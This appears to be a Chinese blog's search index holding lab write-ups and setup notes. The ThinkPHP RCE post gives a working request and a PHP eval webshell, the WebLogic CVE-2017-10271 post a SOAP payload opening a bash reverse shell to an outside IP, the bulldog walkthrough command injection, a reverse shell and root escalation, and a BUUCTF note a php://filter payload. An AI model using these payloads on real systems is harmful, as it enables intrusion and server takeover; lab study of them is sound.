<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>thinkphp 5.0.23 rce 漏洞复现</title>
      <link href="2021/thinkphp5.0.23rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/thinkphp5.0.23rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>thinkphp 5.0.23 rce漏洞利用</p><a id="more"></a><h2 id="thinkphp介绍"><a href="#thinkphp介绍" class="headerlink" title="thinkphp介绍"></a>thinkphp介绍</h2><p>thinkphp是一个快速、兼容而且简单的轻量级国产php开发框架，支持windows/Unix/linux等服务器环境，并且有相当多的CMS是在thinkphp基础上二次开发的。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用<a href="https://github.com/vulhub/vulhub">vulhub</a>搭建环境，过程不赘述。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>抓包并直接发送下面的流量包，即可利用漏洞进行远程代码执行</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1Host: IP:PORTAccept-Encoding: gzip, deflateAccept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: closeContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 79_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;pwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发包可见，命令执行成功</p><div align="center"><p><img src="/2021/thinkphp5.0.23rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/0.1.png"></p></div><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>利用命令执行写入一句话木马，注意一个坑，$符号会被过滤掉，原因不明，因此需要$进行转义：<code>echo &quot;&lt;?php @eval(\$_POST[&#39;dack&#39;])?&gt;&quot; &gt; 7.php</code></p><div align="center"><p><img src="/2021/thinkphp5.0.23rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p></div>通过蚁剑进行连接，成功获取shell。<div align="center"><p><img src="/2021/thinkphp5.0.23rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic(CVE-2017-10271)漏洞复现</title>
      <link href="2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>CVE-2017-10271学习</p><a id="more"></a><h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中</p><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><ul><li>端口：7001</li><li>界面：Error 404–Not Found<h3 id="XML-Decoder反序列化漏洞（CVE-2017-10271）"><a href="#XML-Decoder反序列化漏洞（CVE-2017-10271）" class="headerlink" title="XML Decoder反序列化漏洞（CVE-2017-10271）"></a>XML Decoder反序列化漏洞（CVE-2017-10271）</h3>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用<a href="https://github.com/vulhub/vulhub">vulhub</a>搭建环境，详细搭建过程查看Readme吧。访问目标站点：<a href="http://159.75.42.65:7001/,%E6%98%BE%E7%A4%BA%E4%B8%8B%E9%9D%A2%E7%95%8C%E9%9D%A2%E5%8D%B3%E4%B8%BA%E6%90%AD%E5%BB%BA%E6%88%90%E5%8A%9F%E3%80%82">http://159.75.42.65:7001/,显示下面界面即为搭建成功。</a></p><div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p></div><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="目录检测"><a href="#目录检测" class="headerlink" title="目录检测"></a>目录检测</h3><p>根据资料显示，访问<a href="http://159.75.42.65:7001/wls-wsat/CoordinatorPortType11">http://159.75.42.65:7001/wls-wsat/CoordinatorPortType11</a> 目录，显示如下则可能存在此漏洞。</p><div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p></div><h3 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h3><p>使用Java反序列化工具，可以成功检测出漏洞存在</p><div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p></div><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>方法一：<br>在服务器上开启监听进程</p><div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p></div><p>burpsuit抓包，将请求改为POST并将包内容改为如下</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 640<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soapenv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">work:</span>WorkContext</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>work</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://bea.com/2004/06/soap/workarea/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.4.0<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>/bin/bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>bash -i <span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span> /dev/tcp/124.71.172.229/9999 0<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">work:</span>WorkContext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Envelope</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.1.png"></p></div><p>发送包后，监听服务器会得到远程shell</p><div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.2.png"></p></div>方法二：可以直接使用Java反序列化工具上传jsp木马<div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p></div>通过工具链接，直接拿到shell,因为木马是哥斯拉生成的，就用哥斯拉连接了。<div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p></div>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF刷题笔记WEB篇</title>
      <link href="2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/"/>
      <url>2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>BUUCTF–WEB</p><a id="more"></a><h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>进入链接查看源码可以看到有一个隐藏了都超链接，进入看一下</p><p><img src="/2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/1.png"></p><p>进入php文件后，按照提示点击select跳转后查阅结束。</p><p><img src="/2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/2.png"></p><p>抓包看一下中间存在跳转链接，查看内容。</p><p><img src="/2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/3.png"></p><p>代码审计，提示flag在flag.php文件里，代码没有过滤file函数。</p><p><img src="/2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/5.png"></p><p>利用file函数和伪协议构造peyload</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以base64编码的方式读取到了php文件，进行解码看到flag。</p><p><img src="/2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/6.png"></p><h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>进入题目链接查看源代码发现source.php目录<br><img src="/2020/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0WEB%E7%AF%87/7.png"><br>查看源代码，文件包含，先分析这三行，要求全为真。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">//file变量不为空</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">// file变量不是字符串</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment">// 将file变量传递给emmm类的checkFile函数</span>    <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac安装mysql</title>
      <link href="2020/mac%E5%AE%89%E8%A3%85mysql/"/>
      <url>2020/mac%E5%AE%89%E8%A3%85mysql/</url>
      
        <content type="html"><![CDATA[<p>Mac安装mysql</p><a id="more"></a><p>brew 安装mysql</p><pre class="line-numbers language-none"><code class="language-none">brew install mysql <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动mysql服务</p><pre class="line-numbers language-none"><code class="language-none">mysql.server start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置mysql</p><pre class="line-numbers language-none"><code class="language-none">mysql_secure_installation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按照提示一路配置下来就完成了。</p><pre class="line-numbers language-none"><code class="language-none">mysql -uroot -p <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入密码成功进入mysql</p><p><img src="/2020/mac%E5%AE%89%E8%A3%85mysql/1.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Mac </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac升级node.js到最新版</title>
      <link href="2020/MAC%E5%8D%87%E7%BA%A7node-js%E5%88%B0%E6%9C%80%E6%96%B0%E7%89%88/"/>
      <url>2020/MAC%E5%8D%87%E7%BA%A7node-js%E5%88%B0%E6%9C%80%E6%96%B0%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p>Mac 升级nodejs到最新版</p><a id="more"></a><p>查看本级nodejs版本</p><pre class="line-numbers language-none"><code class="language-none">node -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>清除cache</p><pre class="line-numbers language-none"><code class="language-none">sudo npm cache clean -f <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/MAC%E5%8D%87%E7%BA%A7node-js%E5%88%B0%E6%9C%80%E6%96%B0%E7%89%88/1.png"></p><p> 安装管理工具<code>n</code></p><pre class="line-numbers language-none"><code class="language-none">sudo npm install -g n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装最新版本nodejs</p><pre class="line-numbers language-none"><code class="language-none">sudo n stable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看主机是否更新为最新版本</p><pre class="line-numbers language-none"><code class="language-none">node -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub渗透测试（一）：bulldog1</title>
      <link href="2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/"/>
      <url>2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/</url>
      
        <content type="html"><![CDATA[<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>靶机难度： 初级<br>攻击机：macos<br>靶机：bulldog 1  <a href="https://www.vulnhub.com/entry/bulldog-1,211/">下载地址</a></p><a id="more"></a><h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><h3 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1.信息搜集"></a>1.信息搜集</h3><p>virtualbox启动bulldog环境，界面给出了靶机IP地址。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/1.png"></p></div><p>使用nmap扫描靶机开启的端口和服务。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/2.png"></p></div><p>可以看到80和8080端口有web服务，访问看看。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/3.png"></p></div><h3 id="2-漏洞挖掘"><a href="#2-漏洞挖掘" class="headerlink" title="2.漏洞挖掘"></a>2.漏洞挖掘</h3><p>使用AWVS对目标站点进行扫描，查看目录结构。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/4.png"></p></div><p>目录不多挨个查看，admin目录下是登陆页面，注入和绕过简单测了一下没发现有漏洞。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/5.png"></p></div><p>DEV目录下大篇的英文得到信息：网站没有php，纯django开发，其中有一个shell界面显示要先进行身份验证，并在网页源码中发现邮箱地址和加密密码。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/7.png"><br><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/6.png"></p></div><p>对七条密文进行md5解密，只有两条能解出来😩。</p><ul><li>d8b8dd5e7f000b8dea26ef8428caf38c04466b3e–&gt;bulldoglover</li><li>ddf45997a7e18a25ad5f5cf222da64814dd060d5–&gt;bulldog</li></ul><p>利用前面的邮箱用户名和解密后的密码尝试进行登陆，登录成功但是提示无操作权限。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/8.png"></p></div><p>登录后思路就断了，翻来翻去发现前面的shell界面登录后身份验证就通过了，利用<code>&amp;&amp;</code>绕过白名单，确定此处存在命令注入。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/9.png"></p></div><p>攻击机利用nc监听端口，shell界面使用<code>ls &amp;&amp; bash -i &gt;&amp; /dev/tcp/192.168.0.7/12345 0&gt;&amp;1</code>反弹shell结果。。。。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/10.png"></p></div><p>最后利用echo使用<code>echo “bash -i &gt;&amp; /dev/etc/192.168.0.7/12345 0&gt;&amp;1” | bash</code>成功进行反弹。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/11.png"></p></div><h3 id="3-权限提升"><a href="#3-权限提升" class="headerlink" title="3.权限提升"></a>3.权限提升</h3><p>查看/etc/passwd 发现名为bulldogadmin和django的用户，用<code>find / -user bulldogadmin 2&gt;/dev/null</code>列出用户文件。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/12.png"></p></div><p>查看/home/bulldogadmin/.hiddenadmindirectory/customPermissionApp文件</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/13.png"></p></div><p>发现都是str，利用<code>strings</code>查看，反复分析后发现其中此处有问题，拼接后password被h打断，删除前后的h后得到字符串<code>SUPERultimatePASSWORDyouCANTget</code>。</p><div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/14.png"></p></div>想到23端口开启了ssh，于是ssh远程连接，用户名为bulldogadmin和django，密码用`SUPERultimatePASSWORDyouCANTget`分别尝试，django成功登陆，再用`sudo su -`将权限提升为root权限。<div align="center"><p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/15.png"></p></div>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速搭建hexo博客</title>
      <link href="2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/"/>
      <url>2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。<br> <a id="more"></a><br>由于我的环境是Windows，所以win环境的按着来就好了，Linux环境大同小异。<a href="https://hexo.io/zh-cn/docs/">Hexo手册</a></p><h2 id="一、安装基本环境"><a href="#一、安装基本环境" class="headerlink" title="一、安装基本环境"></a>一、安装基本环境</h2><h3 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1. 安装Git"></a>1. 安装Git</h3><p>Git 是目前比较流行的分布式版本控制系统，我们使用它与github进行交互</p><ul><li>下载对应版本的的git安装就好， <a href="https://gitforwindows.org/">下载地址</a></li><li>装后打开Git Bash 键入<code>git --version</code>可以查看版本号</li></ul><div align="center"><p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/1.png"></p></div><h3 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2. 安装Node.js"></a>2. 安装Node.js</h3><p>Node.js是一个Javascript运行环境，是一个让 JavaScript 运行在服务端的开发平台，我们用来快速生成博客的静态页面，LTS版本为长期支持版，CURRENT版本为最新版，任选一个正常安装即可<a href="https://nodejs.org/en/">下载地址</a>。</p><h2 id="二、开始本地搭建博客"><a href="#二、开始本地搭建博客" class="headerlink" title="二、开始本地搭建博客"></a>二、开始本地搭建博客</h2><h3 id="1-新建本地文件夹"><a href="#1-新建本地文件夹" class="headerlink" title="1. 新建本地文件夹"></a>1. 新建本地文件夹</h3><p>在本地新建一个文件夹用来储存我们的博客，Git Bash进入文件夹下，执行命令：<code>npm install hexo -g</code> 用来安装hexo，</p><h3 id="2-搭建本地服务"><a href="#2-搭建本地服务" class="headerlink" title="2. 搭建本地服务"></a>2. 搭建本地服务</h3><p>依次在本地文件夹根目录下执行以下命令初始化并生成服务。</p><pre class="line-numbers language-none"><code class="language-none">hexo init    # 初始化npm install    # 安装npm依赖包 hexo generate   # 生成静态网页hexo server    # 生成本地服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>全部执行成功后浏览器访问<a href="http://localhost:4000/">http://localhost:4000</a>,如果出现默认的hexo博客，那么我们本地搭建博客就完成了</p><div align="center"><p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/2.png"></p></div><h2 id="三、本地博客发布到网络上"><a href="#三、本地博客发布到网络上" class="headerlink" title="三、本地博客发布到网络上"></a>三、本地博客发布到网络上</h2><h3 id="1-创建Github远程仓库"><a href="#1-创建Github远程仓库" class="headerlink" title="1.创建Github远程仓库"></a>1.创建Github远程仓库</h3><ul><li>这里我们就要用到<a href="https://github.com/">github</a>了。</li><li>有账户的可以略过，没有账户的新建账户，并登录。</li><li>新建一个仓库，仓库名格式设置为：xxxx.github.io,其他可以不动。</li></ul><div align="center"><p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/3.png"></p></div><ul><li>之后我们就可以到如下界面，记录ssh的地址</li></ul><div align="center"><p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/4.png"></p></div>- 在更改本地目录下的_config.yml配置文件，最后加上.<pre class="line-numbers language-none"><code class="language-none">deploy:  type: git  repo: 这里填刚记录的ssh地址  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-将Hexo与-Github连接"><a href="#2-将Hexo与-Github连接" class="headerlink" title="2. 将Hexo与 Github连接"></a>2. 将Hexo与 Github连接</h3><ul><li>按照如下格式输入</li></ul><pre class="line-numbers language-none"><code class="language-none">git config --global user.name &quot;yourname&quot;git config --global user.email &quot;youremail&quot;ssh-keygen -t rsa -C &quot;youremail&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><div align="center"> <p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/5.png"></p></div><ul><li>接下来我们把生成的id_rsa.pub文件用文本编辑器打开，复制里面的内容绑定到GitHub上，标题随意。</li></ul><div align="center"> <p><img src="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/6.png"></p></div>点击新建ssh keys，title随便填，key填写id_rsa.pub的内容即可，应该会要求输入密码<ul><li>测试是否成功</li></ul><pre class="line-numbers language-none"><code class="language-none">ssh -T git@github.com   #注意这里的地址不用改<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提示Are you sure you want to continue connecting (yes/no)?时输入yes<br>当看到Hi Budtit! You’ve successfully authenticated, but GitHub does not provide shell access.时说明配置成功</p><h3 id="3-部署到github"><a href="#3-部署到github" class="headerlink" title="3. 部署到github"></a>3. 部署到github</h3><pre class="line-numbers language-none"><code class="language-none">hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果报错说not found git 我们执行以下命令：<code>npm install hexo-deployer-git 